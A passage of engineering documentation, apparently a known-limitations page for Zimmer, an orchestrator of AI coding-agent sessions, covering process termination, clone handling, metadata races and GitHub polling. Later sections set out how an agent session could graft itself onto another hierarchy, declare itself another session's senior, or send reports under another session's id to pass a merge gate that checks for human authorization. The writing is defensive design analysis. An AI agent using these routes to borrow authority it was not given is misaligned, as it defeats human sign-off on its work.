that is itself mangled is restored mangled. Preservation failing at all is loud: it logs at `.error`
and writes a `warning` to the session's own log.

### A status-summary fork's working directory is empty, and does not know it

A summary fork gets a scaffolded `git init` directory rather than a copy of the source session's
clone, because the summarizer reads a conversation and never builds, boots or opens anything
([#771](https://github.com/tadasant/zimmer/issues/771)). Two edges come with that:

- The prompt tells the fork not to run tools, but that is an instruction, not a constraint. A fork
  that ignores it finds an **empty repository** — one commit-less `git init`, plus Zimmer's own
  `.mcp.json` and whatever `air prepare` injected beside it, and nothing of the source repo. It fails
  immediately and visibly rather than reporting on the wrong tree, which is the better of the two
  failures, and it is the same directory a forced regeneration has always been given for a session
  whose clone was reclaimed long ago.
- That directory reads as **dirty** to `CloneArtifactService` — an untracked `.mcp.json` in a
  commit-less repository is a non-empty `git status --porcelain` — so `DeferredCloneCleanupJob`
  preserves artifacts and holds the clone for `TRASH_RETENTION_PERIOD` instead of deleting it
  immediately. This is not new: a summary fork's clone was already dirty by way of the source's
  uncommitted work. What changed is that the preserved artifacts are now near-empty rather than a
  real bundle and patch, which is strictly less to keep.

Neither affects a user-initiated fork, which copies the tree whole apart from the directories no copy
can relocate — see below.

### A copied clone drops the virtualenv, and only the virtualenv

`NonRelocatableClonePaths` keeps a clone copy — a fork, or `clones:relocate` — from carrying a Python
virtualenv whose console-script shebangs name the clone it came from
([#671](https://github.com/tadasant/zimmer/issues/671), and
[A copied clone sheds what it cannot relocate](/sessions/spawning/#a-copied-clone-sheds-what-it-cannot-relocate)
for why that failed silently). Four edges come with it:

- **It is prospective.** A clone relocated before this shipped still holds an environment pointing at
  its predecessor. Nothing sweeps for those, deliberately: deleting a directory inside a live
  session's working tree is the exact hazard the copy-never-move rule exists to avoid. `rm -rf .venv
  && uv sync` repairs one.
- **A fork of a Python repo starts without an environment**, and finds out when it runs something.
  That is the trade the fix makes — a loud failure that a warm `uv sync` clears in seconds, in place
  of a silent one that runs the wrong checkout's sources.
- **Only virtualenvs are detected.** They are matched by their `pyvenv.cfg` marker plus the `bin/` or
  `Scripts/` directory beside it, which together are definitive. Nothing else is: npm and pnpm write
  `node_modules/.bin` shims as *relative* symlinks with `#!/usr/bin/env node` shebangs, so they
  survive relocation, and blanket-dropping `node_modules` would cost every fork a reinstall to fix a
  hazard that layout does not have. A tool that wrote absolute paths into an ignored directory would
  still be carried, and would need its own detector.
- **A repository that *tracks* a whole virtualenv would have it pruned from the copy.** The script
  directory in the detection rule is what keeps a tracked bare `pyvenv.cfg` fixture out of it, but a
  committed environment is indistinguishable from an installed one. The fork's tree would then be
  missing tracked files, which `CloneArtifactService` reads as deletions — and a committed
  environment of 50+ files, deleted with nothing else changed, trips the
  [mass-deletion guard](#a-session-that-deletes-50-tracked-files-and-nothing-else-loses-those-deletions-on-archive) on a clone that
  is merely pruned. The source clone is untouched either way. No repository Zimmer runs does this.

The scan that finds them walks the source tree once before the copy, skipping `.git`,
`node_modules`, `vendor/bundle`, and whatever the caller is already excluding — ~180 ms on Zimmer's
own clone, against a copy of the same tree that costs seconds. It never follows a symlinked
directory, which both matches what the copy does with one and makes a symlink loop impossible.

### A process in another container cannot be terminated, only left alone

`ProcessTerminationService` signals a pid only once it has matched it against the identity recorded
at spawn — same boot, same PID namespace, same start time
([How a process actually gets terminated](/sessions/lifecycle/#how-a-process-actually-gets-terminated)).
A recycled pid is therefore never signalled. A pid recorded in **another PID namespace** is not
signalled either, and the service reports `:unverifiable` instead: it cannot see that process, so it
does not know whether the process is running. It does not claim `:already_dead`.

That is the honest answer, not a way to reach the process. `ProcessTerminationService` has no way to
hand a termination to the container that owns the pid. Two user actions already have one of their
own: an interrupt from the web process hands the pid to the session's worker through
`interrupt_terminate_pid`, and a pause flips the session's status, which the worker's monitoring
loop acts on. A pause from the web process does call the service, and for a worker's pid it now gets
`:unverifiable` and leaves the kill to the worker. It no longer signals whatever holds that number
in `web`. The recovery paths run in the `worker` container in production, so a foreign pid there was
recorded by a worker container that has been replaced. Usually the container runtime took that
process down with the container. During a deploy's cutover the old worker can still be draining, and
a session `SessionRecoveryService` restarts in that window can briefly have two agents running. The
same is true of any future deployment that runs agents in more than one live container at once.

A pid with **no usable recorded identity** — the orphan cleanup's pids, which come from a host scan
made moments earlier, a session spawned before identities were recorded, or an identity captured
without a start time or for a different pid — is pinned to whatever holds it when termination
starts, and re-checked before every signal. That protects the ladder from a pid that changes hands
part-way through. It cannot show that the pinned process is the one the caller meant. A host with
**no `/proc`** (macOS development) has nothing to pin or compare, so there termination runs on `ps`
and signal 0 alone, recycled pids included.

The identity is written just after the spawn. A termination that runs in the gap, or after a failed
write, compares the pid against the previous turn's identity. If the new process happened to get the
same pid number, it is refused as `:recycled` or `:unverifiable`. Being this process's own child
does not settle it, because every session's agent in a worker is that worker's child. So the gate
does not trust child-ness over the recorded identity.

Between the `/proc` read and the `kill` there is still a window of microseconds that only a pidfd
would close, and Ruby's standard library does not expose one.

Tracked in [#365](https://github.com/tadasant/zimmer/issues/365).

### A log-streaming thread that will not stop is abandoned, not killed

`AgentSessionJob::LogStream#stop!` asks the log-streaming thread to finish and waits
`LOG_STREAM_STOP_TIMEOUT` (5s) for it. If the thread has not finished by then, nothing else happens:
it is left running, and the job moves on. That is deliberate — the thread writes to Postgres, and
`Thread#kill` inside Active Record's connection setup is what poisoned a pooled connection and took
out an unrelated GoodJob thread in [#706](https://github.com/tadasant/zimmer/issues/706). See
[The streaming thread is asked to stop, never killed](/sessions/spawning/#the-streaming-thread-is-asked-to-stop-never-killed).

What that leaves is bounded but real. The stop flag caps the thread at one more iteration, so it
finishes and exits on its own — but in the meantime it is a thread nobody is waiting for, and on the
recovery-restart paths a second streaming thread is already running for the replacement process. The
overrun is logged at `warn` (`"Log-streaming thread for session N did not stop within 5s"`), which is
the only signal an operator gets; nothing counts it, and no alert fires on it.

### A stopped streaming thread stops reading its stderr file, and a truncated one goes unread

Every runtime adapter derives the stderr log path deterministically from the working directory and
reopens it with mode `"w"` at spawn, so a recovery respawn truncates the file underneath a streaming
thread still holding a byte offset into the old process's output. `stream_stderr_lines` detects the
case it can — a file now *shorter* than the offset — and stops reading rather than emit a fragment of
the replacement's output.

It cannot detect the other case. If the replacement has already written *past* the old offset by the
time the old thread reads, the size check passes and a mid-line fragment is logged, and the
replacement's own thread then re-emits the same bytes from byte 0. The window is one iteration wide
(≤0.5s) and the damage is duplicated `verbose` log lines, not lost data.

### Two writers of the same session metadata key still lose one of them

`Session#merge_metadata!` and friends push the merge into PostgreSQL as one statement, so a writer
cannot erase keys it did not name. Every writer to `sessions.metadata` and `sessions.custom_metadata`
in `app/` goes through them ([#70](https://github.com/tadasant/zimmer/issues/70)), and
`NoWholeColumnMetadataWritersTest` scans `app/` on every CI run so a new whole-column
read-modify-write cannot be added without someone adding it to that test's allowlist and saying why.
See [Metadata races](/sessions/spawning/#metadata-races).

What that does not buy:

- **Two writers of the same key are still last-writer-wins.** The merge is atomic per statement, not
  serialized per key. `broadcast_message_count`, the retry counters and the needs-input counter are
  all read-then-increment, so two of them racing lose a count. Nothing in the row is a ledger.
- **A site that writes metadata and another column no longer does it in one `UPDATE`.** Converting
  `update!(running_job_id: nil, metadata: …)` splits it into a merge and an `update!`. Where the pair
  is already inside a transaction — every restart path, the recovery claims, the spot pause — a reader
  outside still sees both or neither. Where it is not, a reader can catch the row between them. Every
  such pair is followed by an AASM transition that was a third statement already, so no caller gained
  a window it did not have.
- **The scan covers `app/` only.** `db/post_deploy/20260830100500_fix_clone_path_metadata.rb` still
  writes the whole column; it is a one-time repair that has already run, and it deletes a key
  conditionally, which is why it was left as it shipped.
- **Creation paths still assign the column in memory.** `Session.create_from_agent_root!`, the two
  session controllers and MCP `start_session` build `metadata` before the row exists, where there is
  no other writer to race and nothing to merge into. `Session#record_explicit_mcp_servers` is the
  in-memory form for those surfaces; `#record_explicit_mcp_servers!` is the persisted twin.

### A killed worker reads as alive for up to 5 minutes, and a follow-up sent in that window does not run

[Stale job supersession](/sessions/spawning/#stale-job-supersession) asks whether the worker holding a
job's lock is still alive, rather than guessing from the job's age. GoodJob answers that from either an
advisory lock (released by Postgres the instant the worker's connection dies) or a heartbeat the capsule
refreshes every 30 seconds and that expires after `GoodJob::Process::EXPIRED_INTERVAL`, 5 minutes. Which
one applies is GoodJob's `advisory_lock_heartbeat` setting, whose default enables it in **development
only** — so in production and staging the answer comes from the heartbeat alone, and a worker killed by
SIGKILL or OOM keeps reading as alive until its row expires.

What happens to a follow-up prompt sent inside that window is worth stating plainly. `AgentSessionJob`
sees a live-looking job, logs "Skipping job", and returns — so the turn does not run. The prompt itself
is no longer lost: [standing down parks it in the session's durable
queue](/sessions/spawning/#standing-down-does-not-throw-the-prompt-away), where it is visible on the
session page, the REST index and the MCP list, and is delivered the moment the session next comes to
rest. What remains is that *nothing brings this session to rest*: `deliver_follow_up!` stamps
`pending_follow_up_prompt` in the session's metadata first, and `CleanupOrphanedSessionsJob`
deliberately skips any session carrying that marker — on the assumption that a job is about to pick it
up. The session can therefore sit `running` with nobody driving it, and the queued prompt waits with
it, until the user sends something else or the marker clears. Outside the 5-minute window the check
works and the prompt lands on the spot.

Enabling `advisory_lock_heartbeat` in production would collapse the window to nothing, at the cost of
holding an advisory lock on the Notifier's already-retained connection for the life of every worker.
`JobLiveness` reads both signals, so flipping the setting needs no code change.

### The liveness probe can also call a live worker dead

The same probe fails in the other direction, and this one is quieter because nothing logs an error. A
worker that is running but whose `good_job_processes` row goes stale for over 5 minutes — a wedged
Notifier thread, a lost LISTEN connection, a pool exhausted under the tight budget in
`config/connection_budget.rb` — is classified `dead_worker`, and its live turn is superseded.

What the superseded turn's *process* then does is no longer left to chance:
[one live agent process per session](/sessions/spawning/#one-live-agent-process-per-session) terminates
it at the point of spawn, and the superseded job's own monitoring loop ends its turn as soon as it sees
ownership move. The misclassification still costs the interrupted turn its work in progress — that part
is unavoidable once the decision has been made wrongly — but it no longer leaves two agents racing on
one branch.

In development, where `advisory_lock_heartbeat` is on, there is a sharper variant: `GoodJob::Process.active`
only consults the heartbeat for rows registered *without* a lock, so a capsule that registered with one
and later drops it reads as dead no matter how fresh its heartbeat is, and does not re-acquire on renew.

Both are strictly less likely than the worker actually being dead — which is why the probe is written this
way — but neither is impossible, and neither announces itself.

### The spawn-time orphan check is inert outside the namespace that spawned the process

[One live agent process per session](/sessions/spawning/#one-live-agent-process-per-session) only acts
when it can prove the recorded pid is the process Zimmer started: same PID namespace, and the same start
time. Three cases are classified `unknown` and pass through untouched.

A pid recorded on **another boot or in another PID namespace** — a worker container that has since been
replaced, a role running on another host, or anything from before a reboot — cannot be checked or
signalled from here. In practice a container replacement takes its children with it, so the process
really is gone; the residual risk is a deployment where the agent outlives the recording container,
which Zimmer does not currently create.

A host with **no `/proc`** (macOS development) can capture neither signal, so the guard never fires
there. Development runs one worker on one machine, where the ownership backstop in the monitoring loop
already covers the common case.

An **identity with no provenance** — a session that was already running when the check deployed, so it
carries a `process_pid` and no `process_identity` — is unprotected until its next spawn records one.

In all three the guard stands down rather than guessing, because guessing "alive" means signalling a
process that may belong to something else entirely.

### State-machine side effects fail without surfacing

Nearly every callback is wrapped in a bare `rescue` that logs and swallows, so cleanup can be skipped
while the state advances anyway.

Tracked in [#73](https://github.com/tadasant/zimmer/issues/73).

### An elicitation Zimmer never hears the end of leaves the session parked, not resumed

Expiry is no longer a ten-minute fuse: the shipped default is an hour, `ELICITATION_EXPIRATION_MINUTES`
moves it per instance, and an MCP server's own `_meta["com.pulsemcp/expires-at"]` still wins for its
own request. A round-trip that ends without a human answer now says so on the session page instead of
leaving a session that looks merely idle.

What remains is the shape of the recovery. A [stranded block](/sessions/elicitation/#when-a-round-trip-ends-without-an-answer)
— the marker outliving its elicitation, because a state race swallowed the unblock or the MCP server
died mid-round-trip — is reconciled by leaving the session in `needs_input` with a banner naming what
happened. Zimmer does not retry the approval or resume the turn on its own: the agent process the
request belonged to may be gone, and flipping the session to `running` would create a phantom running
session with no monitoring job. The lost round-trip is surfaced, not replayed; picking it back up is
a follow-up you send.

Fixed in [#75](https://github.com/tadasant/zimmer/issues/75).

### A session's slug is claimed by retry, not by construction

`Session#generate_slug_from_title!` builds `title-yyyymmdd-hhmm` and, when that is taken, appends
`-1`, `-2`, and so on. The timestamp is minute-granular and a session with no transcript yet takes its
title from `Session#human_prompt`, so every session a trigger spawns in the same minute computes a
byte-identical base slug. Picking a free suffix by reading first is check-then-act, so the losing writer finds out
from `index_sessions_on_slug`; it advances the counter and re-attempts, up to `MAX_SLUG_ATTEMPTS`
(10).

That bound is the sharp edge. Ten simultaneous same-minute writers is far past anything observed — the
worst real burst was two — but a session that exhausts it keeps a `nil` slug, so it is addressable
only by numeric id, and `SessionTitleJob#apply_title` aborts before writing its title-generation log
entry. Nothing retries it later.

The early return has a second consequence: a slug is claimed once and never revised, so a session
named badly stays named badly. Chat-bubble sessions created before
[#809](https://github.com/tadasant/zimmer/issues/809) was fixed carry slugs beginning
`context-about-user-s-current-view-url-https-zimmer-`, and no job repairs them — a re-slug would
break every URL already pointing at them. `update_title` fixes the title on a session that matters;
the slug is permanent.

### Orphaned clones linger for up to 48 hours unless the disk is actually filling

`OrphanCloneFilesystemCleanupJob` on its six-hourly cron is patient — `AGE_THRESHOLD = 48.hours`,
`BATCH_LIMIT = 20` — so an orphaned clone normally sits on the volume for up to two days. Disk
pressure is the exception: `CloneDiskGuard` calls the same job's `reclaim_space` entry point before
each clone, which lowers the age bar to `PRESSURE_AGE_THRESHOLD = 2.hours` and stops as soon as the
volume has room. See [the second gear](/operate/background-jobs/#clone-pruning-has-a-second-urgent-gear).

That is the *only* orphan sweep over the clones base. A second one on a shorter bar collects
orphans sooner — and is also why the pressure path could never find a candidate, because the short
bar had already taken them ([#709](https://github.com/tadasant/zimmer/issues/709)). One owner of the
question is the trade [#808](https://github.com/tadasant/zimmer/issues/808) made unavoidable, and it
has a throughput cost worth stating: six-hourly at `BATCH_LIMIT = 20` is a ceiling of **80 orphan
directories a day**. A box with a real backlog — the 2026-09-02 incident left 48 clones — drains
over days rather than hours, unless disk pressure opens the urgent gear.

What that does **not** reclaim is anything with an owning session row — a tracked `clone_path` is
never a pruning candidate, whatever the session's status and whatever the disk pressure. So a host
whose volume is full of clones belonging to real archived-but-not-yet-reaped sessions is still a
host that needs `StaleCloneCleanupJob` to catch up, or a human. The guard will say so, by name and
with numbers, instead of letting the clone die partway.

### Rebuilding a lost clone recovers the session, not the work in it

When a live session's clone goes missing, Zimmer re-clones the tree from the row and
resumes the conversation rather than failing the session — see
[a clone that vanished is rebuilt, not fatal](/sessions/spawning/#a-clone-that-vanished-is-rebuilt-not-fatal).
What that recovers is the session: its row, its runtime session id, its polled
transcript, its place in the hierarchy, the PR it is holding.

**It does not recover the diff.** Everything uncommitted in the lost tree is gone —
files created, edits not committed, anything staged — and no amount of retrying brings
it back. The agent is told so in the resume prompt and asked to re-read the tree before
it does anything else, but "re-read and redo" is a request, not a guarantee: an agent
that ignores it will reason from a transcript that no longer describes the disk. Work
already pushed to the remote is safe, which is the practical argument for pushing early.

The rebuild is also bounded at `RetryBudget::LOST_CLONE` (2 attempts, reset after 60
seconds of stability). A clone that keeps vanishing is a volume problem, and past that
the session fails so somebody looks at the host rather than watching Zimmer re-clone
forever.

### Private repositories are cloned with a PAT, never an SSH key

`GitCloneService` authenticates to private repos by rewriting an HTTPS remote to
`https://TOKEN@github.com/owner/repo.git` using the GitHub PAT in credentials.
There is no SSH-key path: an `ssh://` or `git@host:` remote gets no credential at all, and a
non-GitHub host gets none either. Tracked in
[#90](https://github.com/tadasant/zimmer/issues/90).

### A session's scratch directory survives archive, but only for the trash window

The [scratch directory](/sessions/spawning/) is durable against restarts and deploys, and it is
durable against archive — but not indefinitely. The contract is:

| Event | Scratch directory |
| --- | --- |
| Container restart, Kamal deploy | Survives (it is on the `zimmer_data` volume) |
| Archive, then unarchive | Survives, contents intact |
| Trash retention expires (`TRASH_RETENTION_PERIOD`, 4 days after archive) | Deleted by `EmptyTrashJob` |
| Archived >1h with no `trash_after`, or failed >24h, **and** the session recorded a `clone_path` | Deleted by `StaleCloneCleanupJob`. Both that job and `EmptyTrashJob` re-read the *whole* selection predicate immediately before deleting — status **and** `trash_after` — so an unarchive-then-re-archive, which restarts the four-day deadline, keeps its undo window instead of being reaped an hour later |
| Any of the above, but the session woke up before the reaper got to it | **Not** deleted — the status is re-read immediately beforehand ([#808](https://github.com/tadasant/zimmer/issues/808)) |
| The session row is hard-deleted | Deleted with the row, by `Session#reclaim_session_directories` |

So a session can trust scratch for recovery state across an archive/unarchive round trip, and cannot
trust it beyond four days in the trash. Prompt attachments (`FileStorageService`,
`ImageStorageService`) are on the same schedule.

Every reaper in that table is driven by a database query, so a row deleted outright used to orphan
its scratch directory and prompt attachments on the volume permanently — nothing that could find
them was left. [#340](https://github.com/tadasant/zimmer/issues/340) closed that with an
`after_destroy_commit` on `Session` plus a filesystem-level
[orphan sweep](/operate/background-jobs/#a-deleted-session-takes-its-directories-with-it) over the
three per-session roots, the equivalent of what `ClonesDirectory.base` has always had. The sweep
runs hourly and ignores anything younger than `ORPHAN_AGE_THRESHOLD`, so a delete that skips the
callback costs a couple of hours rather than forever.

The archive/unarchive half of that used to be false in the other direction:
`DeferredCloneCleanupJob` deleted scratch about ten seconds after archive, and
`UnarchiveSessionService` had no restore path for it, so an unarchived session resumed with an empty
directory and no way to tell it apart from one it had never written to. Fixed in
[#323](https://github.com/tadasant/zimmer/issues/323) by moving the deletion to `EmptyTrashJob`,
which reaps at the trash deadline.

The remaining sharp edge is the last row: a session that fails and is left alone for 24 hours loses
its scratch directory while still being resumable. That window is deliberate — abandoned failed
sessions would otherwise accumulate on the volume forever — but it is shorter than the four days an
archived session gets.

### An abandoned pre-session upload is never reclaimed

Attachments picked in the new-session form are stored under a `temp_<uuid>` directory before a
session exists, and moved to the session's own directory when it is created. Every path that
reclaims one runs after a form submission — so an upload whose form is never submitted (the tab
closed, the draft abandoned) keeps its bytes on the durable volume with nothing left to trigger the
move or the cleanup.

The [orphan sweep](/operate/background-jobs/#a-deleted-session-takes-its-directories-with-it) that
reclaims a deleted session's directories deliberately does not take these: it establishes ownership
by looking the directory name up as a session id, and a `temp_<uuid>` has no id to look up. Sweeping
one on age alone would delete an upload a user is still composing with. The bytes are bounded by the
500 MB per-file cap and nothing else.

### Human messages are not backfilled, and cannot be

`human_messages` starts empty. Every session that existed before this shipped shows no human
messages, which reads as "Zimmer has no record here." For the gating use case that is the safe
answer, and it is honest — but it is not the same claim as "no human ever asked for this", and a
pre-existing session cannot prove authorization it genuinely received. Re-establish it live.

There is no backfill to write. The whole point is that capture keys off the authenticated actor at
the input boundary; reconstructing that actor after the fact from transcript prose is exactly the
guess the feature exists to eliminate.

The *hierarchy* is different and deliberately so: it is derived at read time from the
`custom_metadata.router_session_id` sessions already recorded, so pre-existing trees render
immediately without any migration rewriting a row.

### Two real human acts happen outside Zimmer's input boundary and are invisible

Both are cases where a human genuinely acted and no human message will exist:

- **An agent reading Slack mid-session through the Slack MCP server.** The agent fetches the
  message itself; it never crosses a Zimmer input boundary, so nothing is recorded. This is a
  *better* provenance signal than a relayed string — the agent saw the API response — and the
  record cannot represent it.
- **A human clicking Merge on GitHub.** A merge is a real human act on a real artifact, but it
  reaches Zimmer only as polled artifact state, on the same shared GitHub account every agent
  pushes through.

Neither is a bug in capture; both are boundaries Zimmer does not own. Read an empty record as
"Zimmer has no record", not as "no human acted."

### Web UI attribution is an assumption about the deployment, not a check

Anything typed into the Zimmer web UI is attributed to the user `ZIMMER_ADMIN_USER` names —
`tadasant` unless a deployment says otherwise — because Zimmer has no login and the network
perimeter is the authentication boundary (see [Philosophy](/intro/philosophy/)). The
attribution is exactly as strong as that perimeter: a second human given tailnet access would
silently be recorded as Tadas. That is the same trust model the rest of the app runs on, but a
human-message record makes it a *named* claim, which is a higher bar than the rest of the UI sets.

### `parent_session_id` is agent-settable, so a session can graft itself onto any hierarchy

Nothing checks that the caller of `start_session` (or `POST /api/v1/sessions`) is the session it
names as parent — the API key is shared by the whole fleet and identifies no one. A session can
therefore spawn a child pointed at an unrelated hierarchy, and that child will see the other
hierarchy's human messages.

What it can*not* do is turn them into authorization: those messages arrive marked `elsewhere`, and
`elsewhere` explicitly means "a human said this to another session, not to you". The `here`/`elsewhere`
distinction is the only thing standing between grafting and forged authority, so a consumer that
collapses the two — or a rendering that stops marking it — reopens this. That is why every surface
marks it and why the model refuses edits.

### An uncle edge is self-declared, so a session can attach itself as another session's senior

Uncle edges (see [Hierarchy and human messages](/sessions/hierarchy-and-human-messages/)) are
recorded from an `acting_session_id` the *caller supplies about itself*. Nothing verifies it. This is
not an oversight to be fixed later — there is no ambient caller identity to read: one API key is
shared by the whole fleet, and the MCP endpoint's scoping is per-connection, not per-session (the
self-session server injected into every session is byte-identical across all of them).

So this widens the grafting surface above in two ways:

- **No spawn required.** Grafting via `parent_session_id` means spawning a *new* session pointed at
  someone else's hierarchy. An uncle edge attaches the *calling* session to an existing hierarchy,
  and in both directions at once: the target's hierarchy grows to include the caller's, and the
  caller's grows to include the target's.
- **Any session that can follow up another can do it.** The declaration rides on `follow_up` /
  `send_now` / enqueue, so the reach is exactly the reach of the `sessions` MCP tool group (or a
  bare API key). A session holding only the `self_session` group cannot drive other sessions at all
  and so cannot do this.

What it still can*not* do is manufacture authorization, for exactly the same reason: messages pulled
in across an uncle edge arrive marked `elsewhere`, never `here`. `human_message_here?` — the question
a merge gate asks — is unmoved by any uncle edge, because an edge changes which sessions are *in
scope*, never which session a human *spoke to*. The `here`/`elsewhere` distinction remains the whole
defense.

Three things bound the damage rather than prevent it.

An edge is written into the logs of **both** sessions, naming both ids, the acting session and the
entry point that recorded it — so a graft is visible after the fact rather than silent. Both ends
matter: the shape worth catching is a session calling `follow_up` on *itself* while naming an
unrelated session as the actor, which pulls that hierarchy into its own scope without ever touching
it. Logging only the junior would leave the hierarchy that was reached into with no trace at all.

Every surface — the detail UI, the per-turn prompt injection, and the MCP/REST output — labels an
uncle edge as a *claim* of seniority rather than a fact, so a reader weighing "who is senior here" is
told what kind of assertion it is looking at.

And an edge recorded in error can be removed, from all three of the app's own surfaces
([#299](https://github.com/tadasant/zimmer/issues/299)): the × on an "also senior" chip in the
session-detail hierarchy panel, `action_session` → `remove_uncle`, and
`DELETE /api/v1/sessions/:id/uncle_links/:uncle_id`. All three go through
`Sessions::RemoveUncleEdge`, which removes exactly the one edge named — direction included, so a
request that names the pair the wrong way round is refused with the direction that does exist rather
than deleting the opposite claim — and writes the removal into both sessions' timelines with what
recorded the edge and who detached it. `/supervisor/session_uncle_links` remains as the raw operator
view of the table.

What removal cannot do is undo the reading. An edge widens both hierarchies from the moment it is
written, and every prompt built in between carried the other hierarchy's `elsewhere` entries;
detaching it stops the widening from *now on* and does not unsay what was already injected. So the
bound on a mistaken edge is how quickly someone notices it, which is why the edge is logged at both
ends rather than only inferable from the graph.

If the trust model ever needs this closed properly, the fix is a per-session credential (a token
minted into each session's injected MCP config) rather than anything in the graph code.

### A child's report to its parent is only as attributable as the caller that sent it

`message_parent` ([MCP](/extend/mcp-server/#message_parent-the-one-action-that-exists-only-here),
[REST](/extend/rest-api/#reporting-back-to-the-parent-that-started-you)) resolves its *target*
server-side — the caller names no session, Zimmer reads `parent_session_id` — so the report cannot be
pointed at an arbitrary session the way a self-declared uncle edge can. What is still self-declared is
the *sender*. `POST /api/v1/sessions/:id/message_parent` takes whichever `:id` the caller supplies,
for the reason above: one API key, no ambient caller identity. Anything holding that key can make
session A's parent read a report attributed to session A.

The MCP surface narrows this, and is worth knowing as the exception rather than the rule. An injected
`self_session` connection carries the id of the session it was written for, so a report naming a
*different* session is refused there — the one place that surface enforces its aim rather than only
its actions. A `?tool_groups=self_session` connection with no `session_id`, and the REST endpoint,
cannot check.

The bound on the damage is the same one the uncle edge has: the report is logged into **both**
sessions' timelines naming both ids and the entry point, and the message the parent reads states
which session it came from. A misattributed report is visible after the fact rather than silent. The
proper fix is the same per-session credential.

### Waking a parent to report to it spends the wakes it was sleeping on

Delivering a `message_parent` report to a parent in `waiting` resumes it, and a deliberate resume
cancels the session's pending one-time wake triggers — the ordinary rule for any follow-up, since a
resume means "somebody has taken this session over". A router asleep on
`wake_me_up_when_session_changes_state` for three children, woken by the fourth's report, comes back
with nothing armed and has to re-arm what it still cares about.

This is not special to reporting; a human follow-up does the same. It matters more here because the
caller is an agent that may not know what its parent was waiting on. The alternative — queuing for a
sleeping parent instead of waking it — is worse: the parent that never learns is exactly the one
asleep on a wake that will not fire, which is the hole this closed.

### A session hierarchy is bounded, and a big one is shown truncated

The lineage graph is walked at most 8 levels deep and 150 nodes wide, in both directions — uncle
edges mean "up" fans out rather than forming a chain, so the upward walk carries the same bounds the
downward one always did. A router that has spawned hundreds of sessions renders a truncated graph
with an explicit note rather than the whole fleet. The session you asked about is always included,
but a distant cousin may not be — so "not in the graph" is not proof that no such session exists.

### A reaped subprocess loses a result Zimmer already had

`Open3.capture3` hands back `[stdout, stderr, status]`, and that status is nil whenever the child
was reaped by something other than `capture3`'s own `Process.detach` wait thread — the thread's
`waitpid` gets `ECHILD` and `wait_thr.value` returns nil. `ZombieReaperJob` is careful not to be
that something (see
[Background jobs](/operate/background-jobs/#the-zombie-reaper-only-takes-what-nobody-is-waiting-for)),
but its protection for waiters it cannot see in `ChildWaiterRegistry` is rule 2 — "still defunct a
couple of seconds later" — which is a timing argument, not a guarantee, and nothing stops future
code from reaping more bluntly.

Every call site reads that status through `SubprocessStatus`, which treats nil as a **failure**: a
result nobody can vouch for is not a result. Nothing crashes, and nothing is mistaken for success.
What is lost is the work. On the reaped path stdout and stderr are usually sitting right there and
the command very likely succeeded — only the exit code is missing — yet the caller throws the whole
response away. A poller retries on its next tick, so the cost is one wasted `gh` round trip;
`GitCloneService` and `AirPrepareService` have no next tick, so they classify it transient and
retry the clone outright.

Reading the pipes when the exit code is unknown would mean deciding a command succeeded on the
evidence of its output alone. That is the trade being made deliberately, and it is the cheaper
error.

### An automated poller message that fails to deliver is logged, not retried

`AutomatedSessionMessage#deliver_automated_message` — the path both the merged-PR message and the
merge-conflict message go through — swallows any exception raised while delivering, because one
session that cannot take a message must not abort the poller's sweep of every other session.

The state that triggered the message is written down regardless. `Github::PrStatusEvaluator`
records the PR as `merged`, so the `open` → `merged` transition it keys on is gone by the next poll.
`Github::MergeConflictEvaluator` records the conflict as confirmed, which suppresses re-notification
the same way. Neither message is retried.

The markers at least stay honest. The merged-PR marker is written only for PRs a message actually
went out for, so `github_pull_request_merged_notified` never claims a delivery that didn't happen,
and the session log entry is written inside the delivery transaction and rolls back with it. The
failure is in the Rails log, and nowhere else.

A crash is the case the ordering does cover. Messages go out before the markers are persisted, so a
process that dies in between re-sends on the next poll rather than dropping the notification.

### A suppressed conflict notice is never re-sent, and a failed re-read sends it anyway

A queued merge-conflict notice is re-read against GitHub before it is delivered, and dropped if the
PR now reads mergeable — see
[Background jobs](/operate/background-jobs/#a-conflict-notice-is-re-read-when-it-comes-off-the-queue-not-when-it-was-written).
Two edges come with that.

Retiring the notice also calls `Github::MergeConflictEvaluator.forget_conflict!`, which drops the PR
from both debounce markers so the poller re-derives its state from scratch. That is what stops a
suppression from being permanent — but it costs a full debounce cycle. If the conflict was real and
the `mergeable == true` that suppressed the notice was one of the stale readings the debounce exists
to filter, the session is told again only after two more consecutive conflicting polls: 4 minutes at
the base cadence, and up to 8 once `PollBackoff` has stretched the interval. The notice is not lost,
it is late.

In the other direction the re-read fails open, deliberately: an error, a timeout, a sweep that ran
past `STALENESS_SWEEP_BUDGET_SECONDS`, or GitHub's still-computing `null` all deliver the notice. A
force-push leaves `mergeable` as `null` for a while, so a session that resolves its conflicts and is
handed a turn immediately afterwards can still get the notice it no longer needs. That is the cheap
failure being chosen over the expensive one — a suppressed genuine notice leaves a session asleep on
a PR that can never merge.

A retired row is also not labelled with *why* it was retired. The session log records it, but the
`undelivered` block on the session page can only say that either an archive or the staleness check
was responsible, because nothing on the row itself distinguishes the two producers.

The re-read is also one extra `gh` call per conflict-notice delivery, on the session's turn
boundary. It is bounded by `BoundedSubprocess` so it cannot wedge, and it happens only for the
`automated_merge_conflict` origin, which is rare. It is still a call the three pollers could have
shared — see [#711](https://github.com/tadasant/zimmer/issues/711).

### A parked session can hear about its merged PR up to half an hour late

`PollBackoff` slows each GitHub poller per session according to how long it has been since the user
last touched that session, and past 24 hours of no user activity the floor is 24 hours between
polls. The session most likely to be waiting on a merge is exactly the one with stale user activity:
it did its work, said so, and has been sitting in `needs_input` — or asleep in `waiting` on the
`open-pr` skill's self-wake — ever since. Riding that curve is what left sessions
[4419 and 4422](https://github.com/tadasant/zimmer/issues/494) unpolled through their own merges.

`Github::PrPollPass` therefore caps the interval at
`AWAITING_PR_OUTCOME_MAX_POLL_INTERVAL` (30 minutes) for a session still holding a PR Zimmer has
not seen reach a terminal state — the 8–24 hr bucket's own floor, so a waiting session holds the
cadence it had at 23:59 of idleness rather than falling off a cliff at 24:00. A session whose every
tracked PR has merged or closed is waiting on nothing and keeps the full curve, 24-hour floor
included; that is the case the backoff was written for, and the rate limit it protects is
unchanged. Touching the session still resets the curve to the 30-second cadence.

So the residual delay is up to 30 minutes rather than up to a day. Three caveats.
`Github::CommentEvaluator` keeps its own key inside the pass and still rides the full curve, so a
**comment** on the PR of a long-idle session can still be a day late; it is left there deliberately,
because it spends `gh api` calls of its own and speeding it up for the whole idle population is a
rate-limit decision rather than a free one. `Github::MergeConflictEvaluator` no longer rides it — it
inherits the pass's ceiling, and a PR it already suspects of conflicting pulls the session down to a
two-minute cadence until the debounce resolves
